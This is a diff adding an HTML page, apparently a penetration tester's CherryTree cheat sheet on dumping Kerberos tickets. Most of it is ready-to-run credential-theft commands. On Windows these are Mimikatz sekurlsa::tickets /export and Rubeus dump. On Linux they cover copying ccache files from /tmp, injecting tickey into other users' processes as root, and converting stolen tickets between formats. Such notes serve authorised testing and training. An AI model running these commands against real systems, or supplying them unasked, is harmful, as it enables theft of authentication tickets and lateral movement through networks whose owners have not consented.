@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Dump Tickets</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Kerberos - Dump Tickets</h1></strong><br /><br /><strong><h2>## Dump tickets on Windows</h2></strong><br /><strong><h3>### Mimikatz</h3></strong><br /><code>mimikatz # sekurlsa::tickets /export</code><br /><br /><strong><h3>### Rubeus</h3></strong><br /><code>.\Rubeus dump</code><br /><br /><code>[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;&lt;bas64_ticket&gt;&quot;))</code><br /><br /><strong><h2>## Dump tickets on Linux</h2></strong><br />Check type and location of tickets:<br /><code>grep default_ccache_name /etc/krb5.conf<br /></code><br />• If none return, default is<code> FILE:/tmp/krb5cc_%{uid}.</code><br />• In case of file tickets, you can copy-paste (if you have permissions) to use them<br /><br />In case of being KEYRING tickets, you can use tickey to get them<br /><a href="https://github.com/TarlogicSecurity/tickey">https://github.com/TarlogicSecurity/tickey</a><br /><br />• To dump current user tickets, if root, try to dump them all by injecting in other user processes<br />•  to inject, copy tickey in a reachable folder by all users<br /><code>cp tickey /tmp/tickey</code><br /><code>/tmp/tickey -i</code><br /><br /><strong><h2>## Convert Ticket Format</h2></strong><br /><strong><h3>### ticket_converter</h3></strong><br />To convert tickets between Linux/Windows format, try ticket_converter.py:<br /><a href="https://github.com/Zer1t0/ticket_converter">https://github.com/Zer1t0/ticket_converter</a><br /><br /><code>python ticket_converter.py ticket.kirbi ticket.ccache<br />python ticket_converter.py ticket.ccache ticket.kirbi</code></div>
+</body>
+</html>
